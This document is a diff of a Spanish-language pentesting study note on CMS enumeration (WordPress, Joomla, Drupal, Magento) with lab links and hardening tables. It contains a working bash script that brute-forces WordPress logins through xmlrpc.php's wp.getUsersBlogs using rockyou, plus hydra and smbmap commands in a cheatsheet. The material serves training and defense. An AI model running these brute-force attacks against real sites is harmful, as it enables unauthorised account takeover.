+Laboratorio: <https://github.com/vavkamil/dvwp> (DVWP — WordPress vulnerable para práctica).
+
+### 4.3 Joomla → [[JoomScan Herramienta de Escaneo|JoomScan]]
+
+```bash
+perl joomscan.pl -u https://example.com           # versión + componentes + vulns
+joomscan --url https://example.com -w reports.txt
+```
+
+Arquitectura Joomla: **componentes** (`com_content`, apps completas), **módulos** (bloques de página: menú, banners) y **plugins** (extensiones pequeñas que enganchan eventos). JoomScan identifica versión, componentes instalados y los CVEs asociados; genera **falsos positivos/negativos** — contrastar siempre con la versión real del fichero `administrator/manifests/files/joomla.xml`.
+
+Laboratorio: <https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562> (SQL injection → RCE en Joomla <3.4.6).
+
+### 4.4 Drupal → [[Droopscan]]
+
+```bash
+droopescan scan drupal --url https://example.com
+droopescan scan wordpress --url https://example.com    # también hace WP
+droopescan scan joomla --url https://example.com
+```
+
+Fingerprint: patrones en el código fuente (hashes de plantillas), cabeceras (`X-Generator: Drupal 8`), `CHANGELOG.txt` y estructura de directorios → versión exacta + módulos → CVEs (p. ej. **Drupalgeddon** CVE-2018-7600: <https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600>).
+
+### 4.5 Magento y otras plataformas
+
+```bash
+php magescan.phar scan:all https://example.com     # [[Tabla de Opciones Principales de MageScan|MageScan]]
+```
+
+Magento es e-commerce de gran superficie de ataque: permisos de ficheros incorrectos, extensiones desactualizadas, y —el clásico— **SQL injection** (p. ej. <https://github.com/vulhub/vulhub/tree/master/magento/2.2-sqli>) que permite robar una **cookie de sesión** y hacer *cookie hijacking*: asumir la identidad del administrador sin credenciales.
+
+### 4.6 `xmlrpc.php` de WordPress: enumeración y fuerza bruta amplificada
+
+`xmlrpc.php` expone el protocolo XML-RPC para clientes externos (apps móviles, publicadores). Permite **listar métodos** y, con `wp.getUsersBlogs`, probar miles de credenciales en **una sola petición** (bypass de los límites de login de WordPress).
+
 ```xml
+<!-- file.xml — listar métodos disponibles -->
 <?xml version="1.0" encoding="utf-8"?>
 <methodCall>
-<methodName>system.listMethods</methodName>
-<params></params>
+  <methodName>system.listMethods</methodName>
+  <params></params>
 </methodCall>
 ```
-
-y ya con esto creado lo vamos a usar con ayuda de curl para ver si logramos listar todos los métodos:
 
 ```bash
 curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml
@@ -239,42 +249,35 @@ curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml
 
 ![[Pasted image 20250823143647.png]]
 
-como vemos el que nos interesa es el ultimo que es `getUsersBlogs` y con un ataque de fuerza bruta vamos a intentar enumerar los usuarios validos registrados usando la siguiente estructura xml:
+El método que nos interesa es `wp.getUsersBlogs` (prueba usuario+contraseña):
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <methodCall>
   <methodName>wp.getUsersBlogs</methodName>
   <params>
-     <param><value>usuario</value></param>
-     <param><value>contraseña</value></param>
+    <param><value>usuario</value></param>
+    <param><value>contraseña</value></param>
   </params>
 </methodCall>
 ```
 
-se pude crear otro archivo llamado bruteforce.xml y ponerle el contenido anterior donde ubicamos el usuario y la contraseña lo lo enviamos de igual forma:
-
 ```bash
-curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml
+curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@bruteforce.xml
+# Incorrect username or password.   → credencial mala (sigue iterando)
 ```
 
 ![[Pasted image 20250823144626.png]]
 
-como vemos nos dice que la contraseña es incorrecta y en este caso vamos a crear un script en bash para realizar un ataque de fuerza bruta que intente encontrar la contraseña correcta:
+Script de laboratorio que itera `rockyou` contra el método:
+
 ```bash
 #!/bin/bash
-
-# ctrl_c
-function ctrl_c() {
-  echo -e "\n\nSaliendo......\n\n"
-  tput cnorm
-  exit 1
-}
-
+function ctrl_c() { echo -e "\n\nSaliendo......\n\n"; tput cnorm; exit 1; }
 trap ctrl_c SIGINT
 
 function createXML() {
   password=$1
-
   xmlfile="""
 <?xml version=\"1.0\" encoding=\"UTF-8\"?>
 <methodCall>
@@ -285,114 +288,95 @@ function createXML() {
   </params>
 </methodCall>
 """
-
-  echo $xmlfile >file.xml
-
+  echo $xmlfile > file.xml
   response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml)
-
   if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
     echo -e "[+] La contraseña para el usuario stark es $password"
     exit 0
   fi
-
 }
 
 cat /usr/share/wordlists/rockyou.txt | while read password; do
   createXML $password
 done
-
 ```
-
-> [!tip]
-> La función `ctrl_c` implementa un manejador de señal para `SIGINT` (Ctrl+C), asegurando que el script termine de forma limpia y restaure el cursor de la terminal (`tput cnorm`). Esto es una buena práctica en scripts de Bash interactivos para mejorar la experiencia del usuario.
 
 ![[Pasted image 20250823151734.png]]
 
-### Joomla
+> [!tip] `trap SIGINT`
+> El manejador `ctrl_c` captura Ctrl+C para restaurar el cursor (`tput cnorm`) y salir limpio — patrón estándar de los scripts interactivos del vault (ver [[Bash Scripting - Fundamentos Básicos]]).
 
-Joomla es altamente personalizable y cuenta con una gran cantidad de extensiones disponibles, lo que permite a los usuarios añadir funcionalidades adicionales a sus sitios web sin necesidad de conocimientos de programación avanzados. Joomla también cuenta con una comunidad activa de desarrolladores y usuarios que comparten sus conocimientos y recursos para mejorar el CMS.
+> [!warning] Defensa contra xmlrpc.php
+> WordPress deshabilitó `xmlrpc.php` por defecto en instalaciones nuevas (la REST API lo reemplazó), pero sigue activo en sitios antiguos: bloquearlo (`location = /xmlrpc.php { deny all; }` en Nginx) elimina la amplificación de fuerza bruta y el abuso de pingbacks para DDoS. Como atacante, comprueba primero que exista: `curl -s -X POST https://target/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'`.
 
-A continuación, se comparte el enlace del proyecto que estaremos desplegando en Docker para auditar un Joomla:
+## 5. Tabla metodológica de enumeración
 
-- **CVE-2015-8562**: [https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562]
+| Paso | Objetivo | Herramienta principal | Salida esperada |
+|---|---|---|---|
+| 1. Fingerprint de servicio | Producto + versión por puerto | `nmap -sV -sC` | Tabla puerto → servicio → versión |
+| 2. Banner manual | Confirmar/afinar versión | `nc`, `curl -I`, clientes nativos | Banner exacto, cabeceras |
+| 3. Vulnerabilidades | CVE/Exploit por versión | `searchsploit`, NVD, KEV | Lista priorizada |
+| 4. Enumeración funcional | Usuarios, shares, rutas, módulos | Hydra, SMBMap, Gobuster, WPScan… | Superficie de ataque |
+| 5. Cross-reference | Correlacionar hallazgos | notas + informe | Hipótesis de explotación |
+| 6. Validación segura | Confirmar sin romper | PoC mínimo, laboratorio | Evidencia reproducible |
 
-Una de las herramientas que usamos en esta clase es [[JoomScan Herramienta de Escaneo|JoomScan]].  [[JoomScan Herramienta de Escaneo|JoomScan]] es una herramienta de línea de comandos diseñada específicamente para escanear sitios web que utilizan Joomla y buscar posibles vulnerabilidades y debilidades de seguridad.
+## 6. Endurecimiento (lado defensor)
 
- [[JoomScan Herramienta de Escaneo|JoomScan]] utiliza una variedad de técnicas de enumeración para identificar información sobre el sitio web de Joomla, como la versión de Joomla utilizada, los plugins y módulos instalados y los usuarios registrados en el sitio. También utiliza una base de datos de vulnerabilidades conocidas para buscar posibles vulnerabilidades en la instalación de Joomla.
+| Servicio | Medida |
+|---|---|
+| **FTP** | Prohibir anónimo; usar **SFTP/FTPS**; restringir directorios; cerrar 20/tcp si no se usa activo |
+| **SSH** | Solo claves (`PasswordAuthentication no`), `AllowUsers`, fail2ban, deshabilitar algoritmos antiguos, puerto no estándar reduce ruido (no seguridad) |
+| **HTTP** | Quitar versiones (`ServerTokens Prod`, `X-Powered-By: off`), WAF, HTTPS + HSTS, rate limiting en login |
+| **TLS** | TLS 1.2/1.3 únicamente; deshabilitar SSLv2/v3 y CBC; patches Heartbleed/ROBOT |
+| **SMB** | SMBv1 off, compartir lo mínimo, credenciales fuertes, acceso por ACL, cifrado firma obligatoria |
+| **CMS** | Actualizar core/plugins, eliminar meta generator, ocultar `xmlrpc.php`, deshabilitar enumeración de usuarios, 2FA, backups probados |
+| **Global** | No exponer banners detallados; segmentación; IDS con reglas de enum masiva |
 
-> [!info]
-> La arquitectura de Joomla se basa en componentes, módulos y plugins. Los componentes son las aplicaciones principales (ej. com_content para artículos), los módulos son elementos de página (ej. menú, banners) y los plugins son pequeños fragmentos de código que extienden la funcionalidad de Joomla o de sus componentes.
+## 7. Errores comunes
 
-Para utilizar  [[JoomScan Herramienta de Escaneo|JoomScan]], primero debemos descargar la herramienta desde su sitio web oficial. A continuación se proporciona el enlace al proyecto:
+1. **Confiar en la versión de `-sV` sin confirmarla**: los banners se editan y los probes fallan detrás de proxies.
+2. **Enumerar sin plan**: hacer `gobuster`, `wpscan` y `hydra` a la vez contra todo sin jerarquizar → ruido y bloqueos.
+3. **Olvidar el alcance**: los scaneos agresivos en producción pueden caer servicios viejos (FTP de 2005 se muere con un intento de login malformado).
+4. **No guardar evidencias**: cada enumeración debe ir a un `-oN`/informe con timestamps.
+5. **Confundir share con permisos**: `smbmap` dice "READ, WRITE" contra el *server*; valida siempre escribiendo un fichero de prueba.
+6. **Falsos positivos de WPScan/JoomScan/Droopscan**: contrastar la versión por ruta directa (`/administrator/manifests/files/joomla.xml`, `readme.txt`) antes de explotar.
+7. **Ignorar usuarios enumerados**: `wp.getUsersBlogs`/`/author/x` dan usuarios reales → con `rockyou`+reglas suele caer la cuenta antes que cualquier exploit.
 
-- **Joomscan**: [https://github.com/OWASP/joomscan]
+## 8. Cheatsheet
 
-Una vez descargado, podemos utilizar la siguiente sintaxis básica para escanear un sitio web de Joomla:
+```bash
+nmap -p- -sV --version-intensity 9 -sC -oN enum <IP>     # fingerprint
+searchsploit --nmap enum.xml                              # versión → exploit
+nc -v <IP> 21/22/25                                       # banner manual
+curl -sI https://IP | grep -iE 'server|x-powered|set-cookie'
+curl -s https://IP/ | grep -oiE 'generator" content="[^"]+"'
+whatweb -v https://IP                                     # tecnologías
 
-➜ `perl joomscan.pl -u <URL>`
+# por servicio
+hydra -L users.txt -P rockyou.txt ftp://IP                 # FTP/SSH…
+smbmap -H IP -u U -p P; smbclient //IP/share -U U%P        # SMB
+wpscan --url https://IP -e u,vp                            # WordPress
+joomscan -u https://IP                                     # Joomla
+droopescan scan drupal --url https://IP                    # Drupal
+php magescan.phar scan:all https://IP                      # Magento
+```
 
-Donde `<URL>` es la URL del sitio web que deseamos escanear.  [[JoomScan Herramienta de Escaneo|JoomScan]] escaneará el sitio web y nos proporcionará una lista detallada de posibles vulnerabilidades y debilidades de seguridad.
+## 9. Referencias
 
-Es importante tener en cuenta que  [[JoomScan Herramienta de Escaneo|JoomScan]] **no es una herramienta infalible** y puede generar **falsos positivos** o **falsos negativos**. Por lo tanto, es importante utilizar joomscan junto con otras herramientas y técnicas de seguridad para tener una imagen completa de la seguridad del sitio web de Joomla que estemos auditando.
+- Nmap version detection: <https://nmap.org/book/man-version-detection.html>
+- Exploit Database: <https://www.exploit-db.com/> · NVD: <https://nvd.nist.gov/>
+- WPScan: <https://wpscan.com/> · Droopescan: <https://github.com/SamJoan/droopescan>
+- JoomScan (OWASP): <https://github.com/OWASP/joomscan>
+- MageScan: <https://github.com/steverobbins/magescan>
+- Launchpad (versiones de paquetes Ubuntu): <https://launchpad.net/ubuntu>
+- Vulhub (laboratorios FTP/SMB/CMS): <https://github.com/vulhub/vulhub>
 
-### Drupal
+## Relacionadas
 
-Drupal ofrece un alto grado de personalización y escalabilidad, lo que lo convierte en una opción popular para sitios web complejos y grandes. Drupal se utiliza en una amplia gama de sitios web, desde blogs personales hasta sitios web gubernamentales y empresariales. Es altamente flexible y cuenta con una amplia variedad de módulos y herramientas que permiten a los usuarios personalizar su sitio web para satisfacer sus necesidades específicas.
-
-Una de las herramientas que veremos en esta clase para enumerar un Drupal es la herramienta **[[DroopScan]]**. [[DroopScan]] es una herramienta de escaneo de seguridad especializada en la identificación de versiones de Drupal y sus módulos, y en la detección de vulnerabilidades conocidas en ellos. La herramienta realiza un escaneo exhaustivo del sitio web para encontrar versiones de Drupal instaladas, módulos activos y vulnerabilidades conocidas, lo que ayuda a los administradores de sistemas y desarrolladores a identificar y solucionar los problemas de seguridad en sus sitios web.
-
-Con esta herramienta, se pueden llevar a cabo análisis de seguridad en sitios web basados en Drupal, lo que puede ayudar a prevenir posibles ataques y problemas de seguridad en el futuro.
-
-> [!tip]
-> `DroopScan` realiza fingerprinting de Drupal analizando patrones en el código fuente, cabeceras HTTP, y la estructura de directorios para identificar la versión exacta del CMS y de sus módulos. Esto es crucial para correlacionar con bases de datos de vulnerabilidades conocidas.
-
-A continuación, se proporciona el enlace directo al proyecto en Github:
-
-- **Droopescan**: [https://github.com/SamJoan/droopescan]
-
-Su uso es bastante intuitivo, a continuación se comparte un ejemplo de uso de esta herramienta:
-
-➜ `droopescan scan drupal --url https://example.com`
-
-Donde “**scan**” indica que queremos realizar un escaneo, “**drupal**” especifica que estamos realizando un escaneo de Drupal y “**–url https://example.com**” indica la URL del sitio web que se va a escanear.
-
-Asimismo, se comparte a continuación el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en Docker:
-
-- **CVE-2018-7600**: [https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600]
-
-### Magento
-
-Magento es una plataforma de comercio electrónico de código abierto, que se utiliza para construir tiendas en línea de alta calidad y escalables. Es una de las plataformas más populares para el comercio electrónico y es utilizado por grandes marcas como Nike, Coca-Cola y Ford.
-
-Sin embargo, con la popularidad de Magento también ha surgido la preocupación por la seguridad. Una de las herramientas que veremos en esta clase es **Magescan**, una herramienta de escaneo de vulnerabilidades específica para Magento.
-
-[[Tabla de Opciones Principales de MageScan|MageScan Opciones]] puede detectar vulnerabilidades comunes en Magento, incluyendo problemas con permisos de archivos, errores de configuración y vulnerabilidades conocidas en extensiones populares de Magento.
-
-> [!tip]
-> `Magescan` se enfoca en la detección de vulnerabilidades específicas de Magento, como configuraciones incorrectas de seguridad, versiones desactualizadas de extensiones, y problemas de permisos en archivos y directorios críticos, que son comunes en entornos de comercio electrónico.
-
-A continuación se proporciona el enlace directo al proyecto en Github:
-
-- **Magescan**: [https://github.com/steverobbins/magescan]
-
-Su sintaxis y modo de uso es bastante sencillo, a continuación se comparte un ejemplo:
-
-➜ `php magescan.phar scan:all https://example.com`
-
-Donde “**magescan.phar**” es el archivo ejecutable de la herramienta “**[[Tabla de Opciones Principales de MageScan|MageScan Opciones]]**“, “**scan:all**” es el comando específico de [[Tabla de Opciones Principales de MageScan|MageScan Opciones]] que indica que se realizará un escaneo exhaustivo de todas las vulnerabilidades conocidas en el sitio web objetivo y “**https://example.com**” es la URL del sitio web objetivo que se escaneará en busca de vulnerabilidades.
-
-Asimismo, se comparte el enlace al laboratorio que estaremos desplegando en Docker para configurar el Magento vulnerable:
-
-- **Magento 2.2 SQL Injection**: [https://github.com/vulhub/vulhub/tree/master/magento/2.2-sqli]
-
-Una de las técnicas que explotaremos sobre este gestor de contenidos es la famosa **SQL Injection**. Esta vulnerabilidad se produce cuando los datos de entrada no son debidamente validados y se pueden insertar comandos SQL maliciosos en la consulta a la base de datos.
-
-Un ataque de inyección SQL exitoso puede permitir al atacante obtener información confidencial, como credenciales de usuario o datos de pago, o incluso ejecutar comandos en la base de datos del sitio web.
-
-> [!warning]
-> La Inyección SQL es una de las vulnerabilidades web más críticas. Puede llevar a la exfiltración de bases de datos completas, modificación de datos, escalada de privilegios e incluso ejecución remota de código en el servidor de base de datos, dependiendo de la configuración y los permisos.
-
-En el caso del Magento que estaremos desplegando, explotaremos una inyección SQL con el objetivo de obtener una cookie de sesión, la cual podremos posteriormente utilizar para llevar a cabo un ataque de “**Cookie Hijacking**“. Este tipo de ataque nos permitirá como atacantes asumir la identidad del usuario legítimo y acceder a las funciones del usuario, que en este caso será administrador.
-
-> [!info]
-> El "Cookie Hijacking" o "Secuestro de Sesión" ocurre cuando un atacante obtiene una cookie de sesión válida de un usuario legítimo y la utiliza para autenticarse en la aplicación web como ese usuario, sin necesidad de conocer sus credenciales. Esto es posible si las cookies no están protegidas adecuadamente (ej. falta de flags `HttpOnly` o `Secure`, o transmisión sobre HTTP no cifrado).
+- [[Reconocimiento y Escaneo de Redes y Web]] — la fase que precede a esta
+- [[Nmap Guía Completa]] — todos los modos y scripts NSE
+- [[WPScan]] · [[Droopscan]] · [[JoomScan Herramienta de Escaneo]] · [[Tabla de Opciones Principales de MageScan|MageScan]] — herramientas CMS
+- [[WhatWeb Herramienta de Fingerprinting]] · [[Gobuster]] · [[WFuzz]] — fingerprint y rutas web
+- [[THC Hydra|Hydra]] · [[SMBMap]] · [[smbclient Cliente de Línea de Comandos para SMBCIFS|smbclient]] · [[CrackMapExec Guía de Uso|CrackMapExec]] — por servicio
+- [[SSLScan]] · [[OpenSSL Comandos Principales]] — TLS
+- [[Introducción a la Explotación de Vulnerabilidades]] — qué hacer con los hallazgos
